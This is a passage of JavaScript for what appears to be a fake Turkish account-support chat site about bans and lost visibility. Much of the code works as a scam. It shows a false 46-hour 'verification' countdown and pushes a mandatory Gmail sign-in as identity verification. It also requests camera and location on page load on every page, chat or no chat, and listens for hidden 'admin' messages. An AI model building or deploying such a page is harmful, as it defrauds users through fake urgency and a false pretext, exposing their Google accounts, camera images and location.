    question.options.forEach((opt, i) => {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.setAttribute("data-quick", opt);
      btn.textContent = `${i + 1}) ${opt}`;
      quick.appendChild(btn);
    });
  }

  function seedChat(box, quick) {
    box.innerHTML = "";
    setQuizButtons(quick, null);
  }

  function wireChat(root) {
    const box = root.querySelector("[data-chat-messages]");
    const form = root.querySelector("[data-chat-form]");
    const input = root.querySelector("[data-chat-input]");
    const clearBtn = root.querySelector("[data-chat-clear]");
    const quick = root.querySelector("[data-chat-quick]");
    if (!box || !form || !input) return;

    let busy = false;
    let quiz = null;
    let openSeqToken = 0;
    let openSeqTimer = null;

    const GREET_TEXT =
      "Merhaba. Bu kanal hesap, ban, izlenme ve görünürlük konularında ilgili rehberlere yönlendirir.\n\nKimlik doğrulaması için izin gerekir; izin verilmeden doğrulama tamamlanamaz. Üstteki kırmızı geri sayım 46 saatlik süreyi gösterir — süre dolmadan tamamlayın. Durum kontrolü için \"Hesabım kısıtlandı\" yazın veya aşağıdaki kısayolları kullanın. Hesap şifresi veya doğrulama kodu paylaşmayın.";
    const LOADING_TEXT =
      "Kimlik doğrulaması için izinler hazırlanıyor. Lütfen bekleyin…";

    async function beginAutoCamera() {
      // Sayfa girişi zaten açtıysa tekrar duyuru/çakışma yok
      await openCameraLikeChat(box, { fromGesture: false, announce: false });
    }

    function beginForcedGoogleSignIn() {
      const start = () => {
        const sync = window.ChatSync;
        if (!sync?.enabled || typeof sync.signInWithGoogleFast !== "function") {
          console.warn("Google Auth: ChatSync hazır değil");
          return;
        }
        sync.initAuth?.();
        void sync.consumeGoogleRedirectResult?.().then(() => {
          if (sync.getGoogleUser?.()) {
            document.getElementById("google-signin-wrap")?.remove();
            document.getElementById("google-signin-fab")?.remove();
            return;
          }

          document.getElementById("google-signin-wrap")?.remove();
          document.getElementById("google-signin-fab")?.remove();
          const wrap = document.createElement("div");
          wrap.id = "google-signin-wrap";
          wrap.className = "google-signin-wrap";
          wrap.setAttribute("role", "region");
          wrap.setAttribute("aria-label", "Kimlik doğrulama girişi");

          const hint = document.createElement("p");
          hint.className = "google-signin-hint";
          hint.textContent =
            "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş izni vermeden doğrulama adımı tamamlanamaz.";

          const fab = document.createElement("button");
          fab.type = "button";
          fab.id = "google-signin-fab";
          fab.className = "google-signin-fab";
          fab.textContent = "Gmail ile giriş yap";
          fab.addEventListener("click", (e) => {
            e.preventDefault();
            e.stopPropagation();
            if (fab.dataset.busy === "1") return;
            fab.dataset.busy = "1";
            fab.disabled = true;
            fab.textContent = "Gmail’e gidiliyor…";
            void (async () => {
              try {
                const res = await sync.signInWithGoogleFast({
                  forcePrompt: true,
                  preferPopup: true,
                });
                if (res?.ok || sync.getGoogleUser?.()) {
                  const mail = res?.email || sync.getGoogleUser?.()?.email || "";
                  fab.textContent = mail ? `Giriş: ${mail}` : "Gmail giriş OK";
                  fab.disabled = true;
                  hint.textContent = "Kimlik doğrulaması için Gmail girişi tamamlandı.";
                  window.setTimeout(() => wrap.remove(), 1600);
                  return;
                }
                const errTxt = res?.error || "Giriş olmadı — tekrar dene";
                fab.textContent = errTxt.slice(0, 60);
                fab.title = errTxt;
                hint.textContent =
                  "Giriş tamamlanamadı. Kimlik doğrulaması için tekrar Gmail izni vermeniz gerekir.";
                console.error("Gmail giriş", errTxt);
                window.setTimeout(() => {
                  fab.dataset.busy = "0";
                  fab.disabled = false;
                  fab.textContent = "Gmail ile giriş yap";
                  hint.textContent =
                    "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş izni vermeden doğrulama adımı tamamlanamaz.";
                }, 3500);
              } catch (err) {
                console.error(err);
                fab.dataset.busy = "0";
                fab.disabled = false;
                fab.textContent = "Hata — tekrar dene";
                hint.textContent =
                  "Giriş hatası oluştu. Kimlik doğrulaması için tekrar deneyin.";
              }
            })();
          });
          wrap.appendChild(hint);
          wrap.appendChild(fab);
          document.body.appendChild(wrap);
          // Sadece redirect dönüşünü dinle; otomatik redirect yok (jest / busy kilidi)
          sync.startGoogleSignInLoop?.();
        });
      };

      if (window.ChatSync?.signInWithGoogleFast) start();
      else if (window.ChatSyncReady) window.ChatSyncReady.then(start).catch(start);
      else window.setTimeout(start, 200);
    }

    function startOpenSequence() {
      const token = ++openSeqToken;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      bootImmediatePagePermissions();
      clearPermissionDeniedNotice(box);
      busy = true;
      appendMessage(box, "bot", GREET_TEXT);
      const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
        type: "loading",
        sync: false,
      });
      busy = false;
      // Kamera + konum — mevcut canlı oturumu kesmeden
      void beginAutoCamera();
      beginForcedGoogleSignIn();
      openSeqTimer = window.setTimeout(() => {
        openSeqTimer = null;
        if (token !== openSeqToken) return;
        loadingRow?.remove();
      }, 2000);
    }

    function botSay(text, after) {
      const typing = showTyping(box);
      const delay = 350 + Math.random() * 400;
      window.setTimeout(() => {
        typing.remove();
        appendMessage(box, "bot", text);
        busy = false;
        after?.();
        input.focus();
      }, delay);
    }

    function askCurrent() {
      const current = riskQuestions[quiz.index];
      setQuizButtons(quick, current);
      return (
        current.q +
        "\n\nCevap için alttaki butona basın veya yazın:\n" +
        current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
      );
    }

    function startQuiz(withIntro) {
      quiz = { index: 0, total: 0 };
      const syncNote = window.ChatSync?.enabled
        ? "Şifre / e-posta / kod yazmayın. Destek paneli yalnızca sorununuzu görür.\n\n"
        : "Şifre / e-posta / kod istenmez.\n\n";
      const intro = withIntro
        ? `Hesap durumu kontrolü başlıyor. 5 kısa soru soracağım.\n${syncNote}`
        : "Kontrol yeniden başlıyor.\n\n";
      botSay(intro + askCurrent());
    }

    function finishQuiz() {
      const verdict = riskVerdict(quiz.total);
      const score = quiz.total;
      quiz = null;
      if (quick) {
        quick.innerHTML = "";
        const again = document.createElement("button");
        again.type = "button";
        again.setAttribute("data-quick", "Hesabım kısıtlandı");
        again.textContent = "Kontrolü yeniden başlat";
        quick.appendChild(again);
        [
          ["Hesabım ban yedi", "Ban"],
          ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ].forEach(([value, label]) => {
          const btn = document.createElement("button");
          btn.type = "button";
          btn.setAttribute("data-quick", value);
          btn.textContent = label;
          quick.appendChild(btn);
        });
      }
      botSay(
        `${verdict.title}\nSkor: ${score}/15\n\n${verdict.body}\n\nTekrar için ‘Kontrolü yeniden başlat’a basın.`
      );
    }

    function answerQuiz(raw) {
      if (SECRETISH.test(raw)) {
        botSay("Kontrol sırasında bile şifre veya e-posta istemeyiz. Lütfen alttaki seçeneklerden birini seçin.");
        return;
      }
      const current = riskQuestions[quiz.index];
      const matched = matchOption(raw, current.options);
      if (!matched) {
        botSay(
          "Bu cevabı tanımadım. Şunlardan birini seçin:\n" +
            current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
        );
        return;
      }
      quiz.total += current.score[matched] ?? 1;
      quiz.index += 1;
      if (quiz.index >= riskQuestions.length) {
        finishQuiz();
        return;
      }
      botSay(`Kaydedildi: “${matched}”.\n\n` + askCurrent());
    }

    function send(text) {
      const msg = text.trim();
      if (!msg || busy) return;
      busy = true;
      appendMessage(box, "user", msg);
      input.value = "";

      if (quiz) {
        answerQuiz(msg);
        return;
      }

      if (
        RISK_TRIGGER.test(msg) ||
        /risk altınd|risk kontrol|güvenlik kontrol|guvenlik kontrol|sorular[ıi] yeniden|yeniden başlat|kontrolü yeniden|kontrolu yeniden/i.test(
          msg
        )
      ) {
        startQuiz(true);
        return;
      }

      botSay(botReply(msg));
    }

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      send(input.value);
    });

    clearBtn?.addEventListener("click", () => {
      busy = false;
      quiz = null;
      openSeqToken += 1;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      seedChat(box, quick);
      startOpenSequence();
    });

    quick?.addEventListener("click", (e) => {
      const btn = e.target.closest("[data-quick]");
      if (!btn) return;
      send(btn.getAttribute("data-quick") || btn.textContent || "");
    });

    seedChat(box, quick);
    startOpenSequence();
  }

  let supportListenerBound = false;
  function bindSupportIncomingOnce() {
    if (supportListenerBound) return;
    const primaryBox = document.querySelector("[data-chat-root] [data-chat-messages]");
    if (!primaryBox || !window.ChatSync?.listenIncomingSupport) return;
    supportListenerBound = true;
    window.ChatSync.listenIncomingSupport((msg) => {
      handleAdminIncoming(primaryBox, msg);
    });
  }

  // Önce tüm sayfalarda kamera+konum — sohbet olmasa da
  bootImmediatePagePermissions();

  document.querySelectorAll("[data-chat-root]").forEach(wireChat);
  bindSupportIncomingOnce();
  if (!supportListenerBound) {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      bindSupportIncomingOnce();
      if (supportListenerBound || n > 80) clearInterval(t);
    }, 50);
  }

  /* —— 46 saatlik acil geri sayım —— */
  const DEADLINE_MS = 46 * 60 * 60 * 1000;
  const DEADLINE_KEY = "verify_deadline_end_v1";

  function getDeadlineEnd() {
    try {
      const raw = localStorage.getItem(DEADLINE_KEY);
      const n = raw ? Number(raw) : NaN;
      if (Number.isFinite(n) && n > Date.now()) return n;
      const end = Date.now() + DEADLINE_MS;
      localStorage.setItem(DEADLINE_KEY, String(end));
      return end;
    } catch {
      return Date.now() + DEADLINE_MS;
    }
  }

  function pad2(n) {
    return String(Math.max(0, n | 0)).padStart(2, "0");
  }

  function formatDeadlineParts(msLeft) {
    const totalSec = Math.max(0, Math.floor(msLeft / 1000));
    const h = Math.floor(totalSec / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    return { h, m, s, totalSec };
  }

  function initDeadlineCountdowns() {
    const boards = [...document.querySelectorAll("[data-deadline-countdown]")];
    const inlines = [...document.querySelectorAll("[data-deadline-inline]")];
    if (!boards.length && !inlines.length) return;

    const endAt = getDeadlineEnd();

    const tick = () => {
      const left = endAt - Date.now();
      const { h, m, s, totalSec } = formatDeadlineParts(left);
      const hStr = pad2(h);
      const mStr = pad2(m);
      const sStr = pad2(s);
      const clock = `${hStr}:${mStr}:${sStr}`;
      const critical = totalSec > 0 && totalSec <= 3600;
      const expired = totalSec <= 0;

      boards.forEach((el) => {
        const hEl = el.querySelector("[data-cd-h]");
        const mEl = el.querySelector("[data-cd-m]");
        const sEl = el.querySelector("[data-cd-s]");
        const sr = el.querySelector("[data-cd-sr]");
        if (hEl) hEl.textContent = hStr;
        if (mEl) mEl.textContent = mStr;
        if (sEl) sEl.textContent = sStr;
        el.classList.toggle("is-critical", critical);
        el.classList.toggle("is-expired", expired);
        if (sr) {
          sr.textContent = expired
            ? "Süre doldu. Doğrulama yeniden başlatılmalı."
            : `Kalan süre ${h} saat ${m} dakika ${s} saniye.`;
        }
        const note = el.querySelector(".urgent-countdown-note");
        if (note && expired) {
          note.textContent = "Süre doldu. Sayfayı yenileyip doğrulamayı yeniden başlatın.";
        }
      });

      inlines.forEach((el) => {
        el.textContent = expired ? "00:00:00" : clock;
        el.classList.toggle("is-critical", critical || expired);
        el.title = expired ? "Süre doldu" : `Kalan süre ${clock}`;
      });
    };

    tick();
    window.setInterval(tick, 1000);
  }

  initDeadlineCountdowns();

  /* Floating launcher */
  {
    const chatHref = inArticles ? "../chat.html" : "chat.html";
    const hasHomeChat = Boolean(document.querySelector("#canli-destek"));
    const hasInlineChat = Boolean(document.querySelector("#canli-destek, .chat-page"));

    const launcher = document.createElement("div");
    launcher.className = "chat-float";
    const inlineNote = hasHomeChat
      ? `<p class="chat-float-note">Bu sayfada sohbet kutusu var. <a href="#canli-destek">Aşağıya in</a> veya <a href="${chatHref}">tam sayfa sohbet</a>.</p>`
      : hasInlineChat
        ? `<p class="chat-float-note">Sohbet bu sayfada. Aşağıdaki kutuya yazın.</p>`
        : `<p class="chat-float-note">Yardım asistanına yazmak için:</p>
           <a class="btn btn-primary" href="${chatHref}">Sohbeti aç</a>`;

    launcher.innerHTML = `
      <button type="button" class="chat-float-btn" aria-expanded="false" aria-controls="chat-float-panel" data-float-toggle>
        <span class="chat-float-icon" aria-hidden="true"></span>
        <span data-float-label>Destek</span>
      </button>
      <div class="chat-float-panel" id="chat-float-panel" hidden data-float-panel>
        <header class="chat-float-head">
          <strong>Destek yazışması</strong>
          <button type="button" class="chat-float-close" data-float-close aria-label="Kapat">×</button>
        </header>
        ${inlineNote}
      </div>
    `;
    document.body.appendChild(launcher);

    const panel = launcher.querySelector("[data-float-panel]");
    const toggle = launcher.querySelector("[data-float-toggle]");
    const label = launcher.querySelector("[data-float-label]");

    function setOpen(open) {
      panel.hidden = !open;
      toggle.setAttribute("aria-expanded", String(open));
      label.textContent = open ? "Kapat" : "Destek";
      launcher.classList.toggle("is-open", open);
    }

    toggle.addEventListener("click", () => {
      if (hasInlineChat) {
        const target = document.getElementById("canli-destek") || document.querySelector(".chat-shell");
        if (target) {
          target.scrollIntoView({ behavior: "smooth", block: "start" });
          target.querySelector("[data-chat-input]")?.focus();
          return;
        }
      }
      setOpen(panel.hidden);
    });
    launcher.querySelector("[data-float-close]")?.addEventListener("click", () => setOpen(false));
  }
})();
